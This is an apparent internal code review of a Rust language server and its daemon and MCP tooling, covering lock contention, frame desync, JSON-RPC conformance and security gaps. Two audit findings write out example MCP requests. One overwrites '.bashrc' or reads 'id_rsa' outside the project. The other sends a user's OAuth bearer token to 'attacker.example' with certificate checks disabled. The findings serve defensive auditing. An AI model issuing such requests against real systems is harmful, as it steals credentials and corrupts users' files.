# R1 review: al-lsp and al-protocol

Adversarial read-only review of `crates/al-lsp` and `crates/al-protocol`.
Baseline: AUDIT-BACKLOG.md section "LSP & Protocol" (2026-07-31). Items from that
audit that are still present in current code are tagged [STILL-OPEN].

## Coverage

- [x] AUDIT-BACKLOG.md "LSP & Protocol" section, verify each item against current code
- [x] crates/al-protocol/src/lib.rs
- [x] crates/al-protocol/src/jsonrpc.rs
- [x] crates/al-protocol/src/socket.rs
- [x] crates/al-protocol/src/client.rs
- [x] crates/al-lsp/src/lib.rs + toolchain.rs
- [x] crates/al-lsp/src/bin/al-lsp.rs
- [x] crates/al-lsp/src/server/mod.rs
- [x] crates/al-lsp/src/server/lsp.rs
- [x] crates/al-lsp/src/server/workspace.rs
- [x] crates/al-lsp/src/server/diagnostics.rs
- [x] crates/al-lsp/src/server/commands.rs
- [x] crates/al-lsp/src/server/handlers.rs
- [x] crates/al-lsp/src/server/formatting.rs
- [x] crates/al-lsp/src/server/completions.rs + definition.rs + hover.rs
- [x] crates/al-lsp/src/server/dap_mode/
- [x] crates/al-lsp/src/server/mcp.rs
- [x] crates/al-lsp/src/server/daemon/mod.rs
- [x] crates/al-lsp/src/server/daemon/lsp_dispatch.rs
- [x] crates/al-lsp/src/server/daemon/debug_dispatch.rs
- [x] crates/al-lsp/src/server/daemon/insight_dispatch.rs
- [x] crates/al-lsp/src/server/daemon/build_dispatch/ (mod, build/, fixes, codegen, xliff, symbols_auth)
- [x] crates/al-lsp/src/semantic/ + syntax/
- [x] crates/al-lsp/tests/

## Findings

### [BUG] Generation read guard is still held across long awaits in five request handlers [STILL-OPEN]
- where: crates/al-lsp/src/server/lsp.rs:1656 (goto_implementation), 1699 (references), 1747 (document_symbol), 1825 (semantic_tokens_full), 2015 (symbol)
- severity: high
- scenario: The audit's fix for this class went only into `hover`/`completion`/`inlay_hint`, which now use `snapshot_after_ready` to drop the guard (lsp.rs:622). The five handlers above still do `let _generation = self.await_ready().await?;` and then `tokio::task::spawn_blocking(...).await`, so the `generation_lock` read guard is alive for the whole blocking walk. `tokio::sync::RwLock` is fair, so a queued writer blocks all later readers. Sequence: invoke "Find All References" on a symbol in a large workspace (the walk in `al_analysis::queries::references::references` runs seconds); type a key, so `did_change` (lsp.rs:1222) calls `generation_lock.write().await` and queues; every following `hover`, `completion`, `diagnostic`, `code_lens` calls `await_ready`, whose final line is `self.workspace.generation_lock.read().await` (lsp.rs:525) and queues behind the writer. That read is not covered by the 30 s `timeout` above it, so the requests hang with no deadline until the walk finishes. The document store is not updated in the meantime, so the editor's text and the server's text diverge for the duration.
- fix: Capture what the handler needs under the guard, drop it before the `spawn_blocking(...).await`, and revalidate with `generation_revision()` / the document snapshot afterwards, as `diagnostic` (lsp.rs:1902) and `workspace_diagnostic` (lsp.rs:1944) already do. A shared helper would make the pattern uniform.
- status: fixed 92da8dd9

### [PERF] did_change parses and re-indexes the whole file on the async executor under the write lock
- where: crates/al-lsp/src/server/lsp.rs:1256 (`al_workspace::on_document_change`), implementation at crates/al-workspace/src/lib.rs:918
- severity: medium
- scenario: `on_document_change` runs `AlParser::parse_quick(text)`, `text.to_string()` (a full copy of the document), `procedures_snapshot`, `add_file_with_tree` and symbol-cache invalidation. All of it is synchronous, on the tokio worker, while `did_change` holds `generation_lock.write()`. On a 10k-line AL file every keystroke pays a full reparse plus a full-document clone on the executor thread that also drives all other connections' futures. The crate is otherwise careful to push exactly this kind of CPU work into `spawn_blocking` (references, documentSymbol, semanticTokens, workspaceSymbol).
- fix: Move the parse and re-index into `spawn_blocking`, keeping the write guard only around the store mutation, or debounce the file-index refresh the same way diagnostics are debounced.
- status: fixed ff9f60a1

### [BUG] A partially read or partially written frame desynchronizes the daemon client
- where: crates/al-protocol/src/client.rs:46 (`read_bounded_line`), 192 (`write_all_bounded`), 501 (`read_response`)
- severity: medium
- scenario: The abandoned-id drain only resynchronizes when a *whole* response frame arrives late. Two paths break that assumption. (1) Read side: `read_bounded_line` accumulates into a local `buf` and `consume`s the bytes it took from the `BufReader`. When the request deadline expires mid-frame (a multi-megabyte `workspace/symbol` or `al_build` result still streaming), the function returns `Err`, `buf` is dropped, and the already-consumed prefix is gone. The remainder of that JSON line stays in the socket, so the next `request` reads a truncated fragment and fails with "Failed to parse response" even though the frame was well formed. (2) Write side: `write_all_bounded` can return `Err` after a partial write; `send_request` propagates the error but leaves the connection open, so the next `send_request` appends a second JSON object to the half-written line and the daemon sees one corrupt frame.
- fix: Mark the connection poisoned on any partial-frame read or write (a `desynced: bool` on `DaemonClient`), and either reconnect transparently or fail subsequent requests with a clear "connection out of sync, reconnect" error instead of a parse error.
- status: fixed 620956ba

### [SECURITY] Daemon and MCP file dispatchers accept any absolute path, with no project-root containment
- where: crates/al-lsp/src/server/daemon/mod.rs:1123 (`file_uri_from_params`), 1078 (`ensure_document`), crates/al-lsp/src/server/daemon/build_dispatch/fixes.rs:97 (`dispatch_format`), crates/al-lsp/src/server/daemon/build_dispatch/codegen.rs:104 (`dispatch_new_project`)
- severity: high
- scenario: `file_uri_from_params` validates that the path canonicalizes to an existing regular file and nothing else. No check ties it to the daemon's `project_root`. `al-lsp mcp` publishes `al_call`, which forwards any `method`/`params` pair to `dispatch_request` (mcp.rs:1114). So an MCP client sends `{"name":"al_call","arguments":{"method":"format","params":{"file":"/home/user/.bashrc"}}}`. `dispatch_format` loads that file through `ensure_document` (no extension check, only the size cap in `validate_size`), runs `al_syntax::format_al` over it, and because `check` defaults to false and the formatter output differs from shell script text, `write_al_file_and_refresh` atomically overwrites the user's `.bashrc` with mangled content. The read direction is the same: `{"method":"source","params":{"file":"…/id_rsa"}}` or `format` with `check:true` discloses file content and existence outside the project. `dispatch_new_project` takes a `dir` and creates a project tree at any absolute path; its comment claims requiring `is_absolute()` "prevents path traversal", which it does not.
- note: The containment helper already exists and is well tested: `resolve_output_path_within_project` (build_dispatch/tests_dispatch.rs:248) normalizes `..`, canonicalizes the project root, and resolves symlinked parents, with tests covering parent-dir escape, absolute-outside, and symlink escape (tests_dispatch.rs:2733-2768). It is only wired into the three snapshot/JUnit output-path parameters. The gap is that `file_uri_from_params`, which every other file-taking dispatcher uses, does not call it.
- fix: Promote `resolve_output_path_within_project` to the daemon module and call it from `file_uri_from_params` and `dispatch_new_project`, allowing the configured package cache and `appLocalFolderPaths` as extra permitted roots. At minimum apply it to the write paths (`format`, `fix*`, `sortMembers`, `organizeFiles`, `tests.mutate`, `xlf.*`, `newProject`) before the MCP surface is exposed to an agent.
- status: fixed 0949a7ae

### [BUG] `dispatch_format` calls `block_in_place` without the current-thread-runtime guard every other call site has
- where: crates/al-lsp/src/server/daemon/build_dispatch/fixes.rs:191
- severity: low
- scenario: `tokio::task::block_in_place` panics on a current-thread runtime. Every other call site in the crate guards it by checking `Handle::try_current().runtime_flavor()` first: `ensure_document` (daemon/mod.rs:1088), `scan_current_workspace_symbols` (build_dispatch/mod.rs:276), `xliff::blocking` (xliff.rs:62), `symbols_auth` (symbols_auth.rs:605). This one does not. A `format` request that names a file and does not set `check` therefore aborts the process when the dispatcher is driven from a current-thread runtime, which is what a plain `#[tokio::test]` gives you and what an embedder may use. The shipped binaries build a multi-thread runtime (bin/al-lsp.rs:105, 128), so this is not reachable from the released daemon or MCP server today.
- fix: Reuse the same guarded helper. The `xliff::blocking` function already has the exact shape; promote it to `daemon::blocking` and call it from all five sites.
- status: fixed 00667357

### [GAP] Daemon connections still dispatch strictly sequentially [STILL-OPEN]
- where: crates/al-lsp/src/server/daemon/mod.rs:405 (`handle_connection`'s `while let Some(line)` loop)
- severity: medium
- scenario: The audit's other half of this item (silent drop at the connection limit) is fixed by `reject_connection_over_limit` (daemon/mod.rs:311). Per-request concurrency is not: the loop awaits `dispatch_request` to completion before reading the next line. A client that pipelines `ping` behind a `tests.run` or `downloadSymbols` on the same connection waits for the long call. `al-explorer`'s `DaemonClient` is one connection per process and the MCP path worked around this separately by spawning `tools/call` tasks (mcp.rs:1400), so the daemon transport is the only surface left without it.
- fix: Spawn each request into a task, cap the per-connection in-flight count, and serialize writes behind a `tokio::sync::Mutex` on the writer, mirroring `run_mcp`'s `write_mcp_frame`.
- status: fixed f4fe24a4

### [SLOP] Incorrect rationale comment on the `newProject` absolute-path check
- where: crates/al-lsp/src/server/daemon/build_dispatch/codegen.rs:122
- severity: low
- scenario: The comment says requiring an absolute `dir` prevents path traversal, giving the example `"../../etc/malicious-dir"`. Rejecting relative paths does not prevent traversal: `/etc/malicious-dir` is absolute and passes. The check is still worth keeping (a relative path would resolve against the daemon's cwd, which is not the project), but the stated reason misleads the next reader into thinking containment is handled.
- fix: Rewrite the comment to say what the check actually buys ("a relative path would resolve against the daemon process cwd, not the project") and add the real containment check described in the SECURITY finding above.
- status: fixed 0949a7ae

### [BUG] `al.compile` holds the generation read guard for the whole build
- where: crates/al-lsp/src/server/lsp.rs:2049-2060 (`execute_command`), crates/al-lsp/src/server/commands.rs:242 (`compile`)
- severity: high
- scenario: `execute_command` takes the guard with `let mut generation = Some(self.await_ready().await?)` and drops it only for `al.downloadSymbols*` and `al.reindex`. `al.compile` keeps it. `commands::compile` then runs `native_workspace_compile_diagnostics` (a whole-workspace semantic pass, synchronous, on the async task) and awaits `al_compile::build`, which for `al.useOfficialCompiler=true` spawns `dotnet alc` and waits for it. On a real project that is tens of seconds. For the whole time the read guard is held, so the first keystroke after clicking Compile blocks in `did_change`'s `generation_lock.write().await`, and every later request queues behind that writer. The editor stops accepting AL edits until the build finishes. The same holds for `al.findReferences`, `al.lintFile` and `al.runTest`, which also keep the guard across their awaits.
- fix: Invert the list: drop the guard for every command and let the few that genuinely need a stable generation re-acquire it around the short read they depend on. `commands::compile` already clones everything it needs (root, packages_dir, packages, config) before doing the work, so it does not need the guard at all.
- status: fixed 92da8dd9

### [BUG] Project-scope push diagnostics can spin without ever publishing, stalling edits each pass
- where: crates/al-lsp/src/server/diagnostics.rs:249 (`publish_workspace_diagnostics_parts` retry loop)
- severity: medium
- scenario: The loop takes `generation_lock.read()`, runs `compute_workspace_push_diagnostics` over every indexed file, drops the guard, reacquires it, and if `generation_revision()` moved it calls `yield_now()` and starts over. `al_workspace::on_document_change` bumps the revision on every keystroke (al-workspace/src/lib.rs:986), so with `diagnosticsScope: "project"` on a workspace where the pass takes longer than the user's typing gaps, the loop discards its result and recomputes forever, never publishing. Each iteration also holds the read guard for the whole pass, so the `did_change` writer queued behind it blocks for that long, and the requests queued behind the writer block too. The same code runs from `did_save` (lsp.rs:1412) and `did_close` (lsp.rs:1388), where the user is not necessarily typing, but the debounced path (lsp.rs:892) re-arms on each keystroke and is exactly where it bites.
- fix: Bound the retry (recompute at most once, then publish the older generation with its recorded versions and let the next debounce correct it), and compute from a cloned snapshot rather than under the read guard so the pass never queues a writer.
- status: fixed 0255a549

### [BUG] Daemon "no result" responses omit both `result` and `error`, violating JSON-RPC 2.0
- where: crates/al-lsp/src/server/daemon/lsp_dispatch.rs:45-51 (`ok_response_opt` None branch), 98-103 (`dispatch_definition` Ok(None)), 244-249 (`dispatch_rename` Ok(None))
- severity: medium
- scenario: These build `Response { id, result: None, error: None, .. }`. Both fields carry `#[serde(skip_serializing_if = "Option::is_none")]` (jsonrpc.rs:132, 136), so the wire frame is `{"jsonrpc":"2.0","id":7}`. JSON-RPC 2.0 §5 requires exactly one of `result` or `error` on every response. Concrete: a `definition` request on a position with no target, or `hover` returning `None`, sends that frame. `al-protocol`'s own client tolerates it (`response.result.unwrap_or(Value::Null)`, client.rs:468) and so does the MCP forwarder (mcp.rs:1152), so the bug is invisible in-tree, but any conforming third-party JSON-RPC client rejects it. The crate already carries the correct constructor, `Response::null` (jsonrpc.rs:177), whose doc comment describes this exact case. It has zero call sites outside its own tests, so it is dead code and the bug it was written to prevent is live.
- fix: Replace the three `Response { result: None, error: None }` literals with `Response::null(id)`.
- status: fixed 00667357

### [GAP] Symbol download and CodeLens test runs silently use the first launch configuration
- where: crates/al-lsp/src/server/workspace.rs:910 (`configs[0]`), crates/al-lsp/src/server/daemon/build_dispatch/symbols_auth.rs:265 (`project_configs[0]`), crates/al-lsp/src/server/commands.rs:610 (`configs.into_iter().next()`)
- severity: low
- scenario: A project whose `.vscode/launch.json` lists Sandbox first and Production second gets symbols downloaded from, and CodeLens tests run against, whichever entry happens to be first in the file. There is no parameter to name one, and no message saying which was picked. `al_debug` already accepts a `config` name for exactly this reason (mcp.rs schema `config`: "exact debug configuration name"), so the convention exists and these three paths do not follow it.
- fix: Accept an optional `config` name on `downloadSymbols` and `al.runTest`, match it against `BcServerConfig::display_name()`, and when it is omitted log or report the chosen configuration's name in the result.
- status: fixed 4af032d6

### [BUG] Optimistic staging loops never converge while the user is typing
- where: crates/al-lsp/src/server/workspace.rs:546 (`refresh_current_symbol_generation`), crates/al-lsp/src/server/lsp.rs:1495-1580 (`did_change_configuration` package-reload loop)
- severity: medium
- scenario: Both loops snapshot `generation_revision`, do the expensive staging in `spawn_blocking`, reacquire the write lock, and `continue` when the revision moved. `on_document_change` bumps the revision on every keystroke (al-workspace/src/lib.rs:986). Concrete: the user runs `al.downloadSymbols`, which ends in `refresh_current_symbol_generation`, then goes back to typing. Each iteration re-runs `load_packages_cached` over every `.app` in the package cache (seconds of CPU and disk on a real BC project), finds the revision moved, and starts over. The symbol index is never published while typing continues, and there is no iteration cap or backoff. `did_change_configuration`'s loop is identical, and fires on any settings change that touches `packageCachePath` or `appLocalFolderPaths`.
- fix: Separate the revisions. Document edits do not invalidate a package generation, so stage against a package/project revision counter that only project and configuration changes bump, or cap the retries and publish with a forced write on the last attempt.
- status: fixed 0255a549

### [BUG] Aborting an in-flight reindex can leave a half-published workspace generation
- where: crates/al-lsp/src/server/commands.rs:225 (`prev.abort()`), crates/al-lsp/src/server/workspace.rs:517 (`publish_complete_generation`)
- severity: medium
- scenario: `publish_complete_generation` holds `generation_lock.write()` and then runs `file_index.replace_with`, `symbols.replace_with`, `*workspace.project.write().await = project`, `set_package_info`, `invalidate_insight_graph`, and finally the `generation_revision` bump. The `project.write().await` in the middle is a cancellation point. `al.reindex` aborts any previous reindex task (commands.rs:225), so clicking Reindex twice while a request holds `project.read()` cancels the first task exactly there: the file index and symbol index have been replaced, the project has not, the revision was never bumped, and the write guard is released on unwind. Every optimistic publisher that compares `generation_revision` then concludes nothing changed, and `require_project_root` hands out the previous project root against the new file index.
- fix: Make the publication section free of await points (take the project lock with `blocking_write` inside a `spawn_blocking`, or hold a pre-acquired guard), or replace the abort with a cooperative cancel flag checked before publication starts.
- status: fixed 8981419e

### [PERF] Four insight dispatchers still build the workspace call graph on the async connection task [STILL-OPEN]
- where: crates/al-lsp/src/server/daemon/mod.rs:645 (`insightStats`), 674 (`tableImpact`), 683 (`traceChain`), 684 (`eventMap`); implementations at insight_dispatch.rs:140, 268, 281, 310
- severity: medium
- scenario: The audit's fix wrapped `trace`, `entrypoints`, `graphExport`, `impact` and `suggestEvent` in the new `offload` helper (daemon/mod.rs:565). These four were left as direct synchronous calls, and each one starts with `workspace.get_or_build_call_graph()`, the same lazy whole-workspace enriched build. On a cold graph, `al_call {"method":"eventMap"}` (or the CLI's `al events map`) runs that build inline on the tokio worker that also drives the daemon's accept loop and every other connection's reads and writes, so unrelated clients stall for the length of the build.
- fix: Route these four through `offload` exactly as the other five now are.
- status: fixed 00667357

### [SECURITY] `al_debug start` sends a freshly acquired OAuth bearer token to a caller-supplied server URL
- where: crates/al-lsp/src/server/daemon/debug_dispatch.rs:277-360, `has_inline_debug_config` at 233, `debug_uses_oauth` at 225; config built by `BcDebugConfig::from_dap_args` (al-dap/src/dap/bc_debug/session_config.rs:212)
- severity: high
- scenario: `has_inline_debug_config` returns true as soon as the params carry `server`, `tenant` or `environmentName`, and the handler then builds the whole config from those params with `from_dap_args` — no project launch config involved, no host check in `validate_native`. An MCP client calls the published `al_debug` tool (its schema advertises `server`, `tenant`, `environmentType`, `authentication`) with `{"cmd":"start","server":"https://attacker.example","serverInstance":"BC","environmentType":"OnPrem","authentication":"AAD","tenant":"<the user's real tenant>","launchBrowser":true}`. `debug_uses_oauth` is true because `authentication` is AAD, and `accessToken` was omitted, so the daemon acquires a real bearer token for the user's tenant through the keyring-backed OAuth cache (debug_dispatch.rs:306-320). Because `environment_type` is OnPrem and `launch_browser` is true, it then calls `get_web_endpoint(&http, &config, &access_token)` (debug_dispatch.rs:354), sending that bearer to the attacker-named URL. `acceptInvalidCerts` is settable from the same params and is passed straight into `danger_accept_invalid_certs` (debug_dispatch.rs:341), so TLS verification can be turned off in the same call.
- fix: Only acquire a token from the shared cache when the target came from a project launch configuration (`resolve_debug_config`). For an inline config, require an explicit `accessToken`, or validate the `server` host against the hosts in the project's `.vscode/launch.json` / `.zed/debug.json`. Also refuse `acceptInvalidCerts` unless it is set in the project's own launch configuration.
- status: fixed 6d765b94

## Audit items verified as fixed (not re-reported)

Checked against current code and confirmed closed: per-URI diagnostics debounce
(`diag_tasks` map, lsp.rs:165 plus tests at lsp.rs:2550); hover/completion/inlayHint
guard release via `snapshot_after_ready` (lsp.rs:622); `RequestId` string/null ids and the
notification rule (al-protocol/src/jsonrpc.rs:22-125, daemon/mod.rs:463-522); client drain of
abandoned response ids (client.rs:296, 501); idle reaper `InFlightGuard` (daemon/mod.rs:385);
per-file degradation in `initialize_daemon_workspace` (daemon/mod.rs:1211); `project_state_with_wait`
replacing `try_read` (daemon/mod.rs:1000); guarded `block_in_place` in `scan_current_workspace_symbols`
(build_dispatch/mod.rs:268); `minItems` in `validate_schema_value` (mcp.rs:386); `"id": null`
treated as a request on both MCP paths (mcp.rs:1029, 1200); bounded MCP stdio reads (mcp.rs:1351);
`full_document_end` (formatting.rs:76); `TextDocumentSyncKind::INCREMENTAL` (lsp.rs:991);
`insert_text_format` for snippets (completions.rs:81); `CodeActionContext.only` filtering
(handlers.rs:64); `runnables` position filtering (lsp.rs:2274); concurrent MCP `tools/call`
plus `notifications/cancelled` (mcp.rs:1376-1418); connection-limit rejection frame
(daemon/mod.rs:311); `spawn_blocking` for `al.findReferences` and `workspace/symbol`
(commands.rs:538, lsp.rs:2020); cheap `document_needs_formatting` probe (handlers.rs:191);
the longer `WORKSPACE_DIAGNOSTICS_DEBOUNCE` (lsp.rs:48); black-box transport tests
(tests/lsp_transport.rs) and UTF-16 tests (tests/lsp_integration.rs:1669-1732,
tests/lsp_transport.rs:144).

## Review complete

1. Five LSP handlers (references, implementation, documentSymbol, semanticTokens,
   workspaceSymbol) plus `al.compile` still hold the `generation_lock` read guard across a
   long await, so one Find-All-References or one build freezes `did_change` and every
   request queued behind it. The audit's fix reached only hover/completion/inlayHint.
2. `al_debug start` accepts an inline config, acquires a real OAuth bearer token for the
   named tenant from the keyring cache, and sends it to the caller-supplied `server` URL,
   with caller-settable `acceptInvalidCerts`. Reachable straight from the published MCP tool.
3. No project-root containment on `file_uri_from_params`, so `al_call {"method":"format",
   "params":{"file":"…"}}` reads and overwrites any file the daemon user can write. The
   containment helper already exists and is tested, but is wired only into snapshot outputs.
4. Two optimistic staging loops (`refresh_current_symbol_generation`,
   `publish_workspace_diagnostics_parts`) retry unbounded against a revision that every
   keystroke bumps, so they can recompute the whole workspace forever without publishing.
5. Smaller but real: daemon "no result" frames omit both `result` and `error` (the correct
   `Response::null` constructor is dead code), aborting a reindex can leave a half-published
   generation, per-connection daemon dispatch is still sequential, four insight dispatchers
   never got the `offload` treatment, and `dispatch_format` is the one `block_in_place` call
   site without the current-thread guard.
